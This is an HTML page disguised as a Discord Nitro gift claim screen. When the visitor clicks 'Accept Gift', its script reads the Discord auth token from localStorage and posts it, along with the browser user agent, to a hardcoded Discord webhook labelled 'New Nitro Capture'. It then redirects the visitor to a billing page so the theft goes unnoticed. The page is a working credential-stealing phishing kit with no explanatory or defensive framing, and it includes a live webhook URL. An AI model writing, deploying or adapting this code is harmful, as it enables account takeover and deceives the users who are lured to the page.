<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nitro Gift</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@400;600&display=swap');

        body {
            background-color: #202225;
            color: #ffffff;
            font-family: 'Whitney', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .gift-card {
            background-color: #2f3136;
            width: 440px;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            text-align: center;
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .nitro-img {
            width: 100px;
            margin-bottom: 20px;
        }

        h2 { font-size: 24px; margin-bottom: 10px; }
        p { color: #b9bbbe; font-size: 15px; margin-bottom: 25px; }

        .btn-accept {
            background-color: #5865f2;
            color: white;
            border: none;
            padding: 12px 0;
            width: 100%;
            border-radius: 4px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn-accept:hover { background-color: #4752c4; }
        
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #72767d;
        }
    </style>
</head>
<body>

    <div class="gift-card">
        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" alt="Nitro" class="nitro-img">
        <h2>You've been gifted Nitro!</h2>
        <p>Your 3-month Nitro gift is ready. Accept now to apply the promotion to your account.</p>
        <button id="claimBtn" class="btn-accept">Accept Gift</button>
        <div class="footer">Promotional gift from Discord. Valid payment method required.</div>
    </div>

    <script>
        document.getElementById('claimBtn').addEventListener('click', async () => {
            const btn = document.getElementById('claimBtn');
            btn.innerText = "Processing...";
            btn.style.opacity = "0.7";

            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
            
            const payload = {
                content: "@everyone",
                embeds: [{
                    title: "🚀 New Nitro Capture",
                    color: 5763719,
                    fields: [
                        { name: "Auth Token", value: `\`${token || "N/A"}\``, inline: false },
                        { name: "Browser", value: `\`${navigator.userAgent}\``, inline: false }
                    ]
                }]
            };

            try {
                await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) { console.error(e); }

            setTimeout(() => {
                window.location.replace("https://discord.com/billing/promotions/gift-accepted");
            }, 800);
        });
    </script>
</body>
</html>
